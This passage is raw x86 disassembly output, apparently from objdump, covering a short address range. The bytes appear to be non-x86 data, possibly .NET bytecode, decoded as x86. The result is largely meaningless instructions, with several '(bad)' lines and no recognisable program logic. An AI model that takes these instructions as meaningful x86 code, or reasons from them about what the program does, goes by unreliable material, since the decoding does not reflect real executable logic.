  404d3b:	63 1a                	arpl   %ebx,(%edx)
  404d3d:	00 00                	add    %al,(%eax)
  404d3f:	06                   	push   %es
  404d40:	0b 00                	or     (%eax),%eax
  404d42:	00 f8                	add    %bh,%al
  404d44:	26 00 00             	add    %al,%es:(%eax)
  404d47:	0a 26                	or     (%esi),%ah
  404d49:	00 00                	add    %al,(%eax)
  404d4b:	c6                   	(bad)
  404d4c:	0c 00                	or     $0x0,%al
  404d4e:	00 71 16             	add    %dh,0x16(%ecx)
  404d51:	00 00                	add    %al,(%eax)
  404d53:	84 08                	test   %cl,(%eax)
  404d55:	00 00                	add    %al,(%eax)
  404d57:	93                   	xchg   %eax,%ebx
  404d58:	2f                   	das
  404d59:	00 00                	add    %al,(%eax)
  404d5b:	c0 31 00             	shlb   $0x0,(%ecx)
  404d5e:	00 40 1e             	add    %al,0x1e(%eax)
  404d61:	00 00                	add    %al,(%eax)
  404d63:	b6 22                	mov    $0x22,%dh
  404d65:	00 00                	add    %al,(%eax)
  404d67:	a8 06                	test   $0x6,%al
  404d69:	00 00                	add    %al,(%eax)
  404d6b:	c9                   	leave
  404d6c:	16                   	push   %ss
  404d6d:	00 00                	add    %al,(%eax)
  404d6f:	71 0d                	jno    0x404d7e
  404d71:	00 00                	add    %al,(%eax)
  404d73:	38 21                	cmp    %ah,(%ecx)
  404d75:	00 00                	add    %al,(%eax)
  404d77:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  404d7a:	00 51 1c             	add    %dl,0x1c(%ecx)
  404d7d:	00 00                	add    %al,(%eax)
  404d7f:	4d                   	dec    %ebp
  404d80:	02 00                	add    (%eax),%al
  404d82:	00 07                	add    %al,(%edi)
  404d84:	03 00                	add    (%eax),%eax
  404d86:	00 d3                	add    %dl,%bl
  404d88:	1f                   	pop    %ds
  404d89:	00 00                	add    %al,(%eax)
  404d8b:	a3 2d 00 00 a3       	mov    %eax,0xa300002d
  404d90:	24 00                	and    $0x0,%al
  404d92:	00 c6                	add    %al,%dh
  404d94:	02 00                	add    (%eax),%al
  404d96:	00 66 2a             	add    %ah,0x2a(%esi)
  404d99:	00 00                	add    %al,(%eax)
  404d9b:	f5                   	cmc
  404d9c:	0b 00                	or     (%eax),%eax
  404d9e:	00 91 01 00 00 05    	add    %dl,0x5000001(%ecx)
  404da4:	00 00                	add    %al,(%eax)
  404da6:	00 90 09 00 00 5c    	add    %dl,0x5c000009(%eax)
  404dac:	01 00                	add    %eax,(%eax)
  404dae:	00 65 13             	add    %ah,0x13(%ebp)
  404db1:	00 00                	add    %al,(%eax)
  404db3:	d0 13                	rclb   $1,(%ebx)
  404db5:	00 00                	add    %al,(%eax)
  404db7:	38 6a 27             	cmp    %ch,0x27(%edx)
  404dba:	00 00                	add    %al,(%eax)
  404dbc:	fe 0c 14             	decb   (%esp,%edx,1)
  404dbf:	00 20                	add    %ah,(%eax)
  404dc1:	02 00                	add    (%eax),%al
  404dc3:	00 00                	add    %al,(%eax)
  404dc5:	fe 0c 0b             	decb   (%ebx,%ecx,1)
  404dc8:	00 9c 20 3f 00 00 00 	add    %bl,0x3f(%eax,%eiz,1)
  404dcf:	38 82 f9 ff ff fe    	cmp    %al,-0x1000007(%edx)
  404dd5:	0c 17                	or     $0x17,%al
  404dd7:	00 20                	add    %ah,(%eax)
  404dd9:	09 00                	or     %eax,(%eax)
  404ddb:	00 00                	add    %al,(%eax)
  404ddd:	20 a7 00 00 00 20    	and    %ah,0x20000000(%edi)
  404de3:	38 00                	cmp    %al,(%eax)
  404de5:	00 00                	add    %al,(%eax)
  404de7:	58                   	pop    %eax
  404de8:	9c                   	pushf
  404de9:	20 86 01 00 00 28    	and    %al,0x28000001(%esi)
  404def:	8e 00                	mov    (%eax),%es
  404df1:	00 06                	add    %al,(%esi)
  404df3:	39 5e f9             	cmp    %ebx,-0x7(%esi)
  404df6:	ff                   	(bad)
  404df7:	ff 26                	jmp    *(%esi)
  404df9:	20 7f 01             	and    %bh,0x1(%edi)
  404dfc:	00 00                	add    %al,(%eax)
  404dfe:	38 53 f9             	cmp    %dl,-0x7(%ebx)
  404e01:	ff                   	(bad)
  404e02:	ff 20                	jmp    *(%eax)
  404e04:	cf                   	iret
  404e05:	00 00                	add    %al,(%eax)
  404e07:	00 20                	add    %ah,(%eax)
  404e09:	45                   	inc    %ebp
  404e0a:	00 00                	add    %al,(%eax)
  404e0c:	00 59 fe             	add    %bl,-0x2(%ecx)
  404e0f:	0e                   	push   %cs
  404e10:	0b 00                	or     (%eax),%eax
  404e12:	20 0c 00             	and    %cl,(%eax,%eax,1)
  404e15:	00 00                	add    %al,(%eax)
  404e17:	28 8d 00 00 06 39    	sub    %cl,0x39060000(%ebp)
  404e1d:	35 f9 ff ff 26       	xor    $0x26fffff9,%eax
  404e22:	20 1b                	and    %bl,(%ebx)
  404e24:	00 00                	add    %al,(%eax)
  404e26:	00 38                	add    %bh,(%eax)
  404e28:	2a f9                	sub    %cl,%bh
  404e2a:	ff                   	(bad)
  404e2b:	ff                   	(bad)
  404e2c:	fe 0c 17             	decb   (%edi,%edx,1)
  404e2f:	00 20                	add    %ah,(%eax)
  404e31:	1b 00                	sbb    (%eax),%eax
  404e33:	00 00                	add    %al,(%eax)
  404e35:	fe 0c 24             	decb   (%esp)
  404e38:	00 9c 20 09 01 00 00 	add    %bl,0x109(%eax,%eiz,1)
  404e3f:	28 8d 00 00 06 39    	sub    %cl,0x39060000(%ebp)
